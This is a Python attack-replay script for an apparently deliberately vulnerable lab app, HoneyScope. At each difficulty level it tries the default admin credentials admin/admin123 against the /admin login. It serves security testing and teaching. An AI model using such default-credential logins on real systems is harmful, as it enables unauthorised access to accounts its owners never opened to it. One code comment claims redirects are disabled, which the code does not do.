#!/usr/bin/env python3
"""Replay the weak-admin scenario against a running HoneyScope instance.

Usage:
    python attack.py http://localhost:5000 [low|medium|high|impossible]

Only run against instances you own or have explicit permission to test.
Standard library only — no external dependencies.
"""
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _load_meta():
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "scenario.json")) as f:
        return json.load(f)


def _post(base_url: str, path: str, data: dict) -> tuple[int, str, dict]:
    """POST form data; return (status_code, body_text, response_headers)."""
    url = base_url.rstrip("/") + path
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    # We disable automatic redirect following so we can inspect the 302.
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
    opener.addheaders = []
    try:
        resp = opener.open(req)
        return resp.status, resp.read().decode("utf-8", errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace"), dict(e.headers)


# ---------------------------------------------------------------------------
# Level-specific attack logic
# ---------------------------------------------------------------------------

def _attack_low(base_url: str, payloads: dict) -> bool:
    """Submit hardcoded credentials and expect a redirect to /admin/dashboard."""
    status, body, headers = _post(base_url, "/admin", payloads)
    # Flask returns 302 on success; urllib follows it and returns 200 from dashboard.
    succeeded = "Admin Dashboard" in body or "admin_flag" in body or status in (200, 302)
    print(f"  POST /admin → HTTP {status}")
    if succeeded:
        print("  ✓ Login succeeded — default credentials admin/admin123 accepted.")
    else:
        print("  ✗ Login failed.")
    return succeeded


def _attack_medium(base_url: str, payloads: dict) -> bool:
    """Same credentials — still works because HONEYSCOPE_ADMIN_PASS defaults to admin123."""
    return _attack_low(base_url, payloads)


def _attack_high(base_url: str, payloads: dict) -> bool:
    """Submit once — works if fewer than 5 failures have been recorded for this IP."""
    status, body, _ = _post(base_url, "/admin", payloads)
    succeeded = "Admin Dashboard" in body or "admin_flag" in body or status in (200, 302)
    print(f"  POST /admin → HTTP {status}")
    if succeeded:
        print("  ✓ Login succeeded — rate limit not yet triggered for this IP.")
    else:
        print("  ✗ Login failed or rate limit already triggered.")
    return succeeded


def _attack_impossible(base_url: str, payloads: dict) -> bool:
    """Expected to fail: impossible level requires a strong env-var password."""
    status, body, _ = _post(base_url, "/admin", payloads)
    succeeded = "Admin Dashboard" in body or "admin_flag" in body
    print(f"  POST /admin → HTTP {status}")
    if succeeded:
        print("  ✓ Succeeded (HONEYSCOPE_ADMIN_PASS was not changed from default).")
    else:
        print("  ✗ Blocked — impossible level is working correctly.")
    return succeeded


# ---------------------------------------------------------------------------
# Entry-point
# ---------------------------------------------------------------------------

DISPATCHERS = {
    "low": _attack_low,
    "medium": _attack_medium,
    "high": _attack_high,
    "impossible": _attack_impossible,
}


def attack(base_url: str, level: str) -> bool:
    """Return True if the attack succeeded at *level*."""
    meta = _load_meta()
    payloads = meta["payloads"][level]
    # Remove any explanatory notes before POSTing.
    form_data = {k: v for k, v in payloads.items() if k != "note"}
    fn = DISPATCHERS.get(level)
    if fn is None:
        raise ValueError(f"Unknown level: {level!r}. Choose from: {list(DISPATCHERS)}")
    return fn(base_url, form_data)


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"

    print(f"[weak-admin] Attacking {base} at level={lvl}")
    ok = attack(base, lvl)
    print(f"[{lvl}] {'SUCCEEDED' if ok else 'FAILED'}")
    sys.exit(0 if ok else 1)
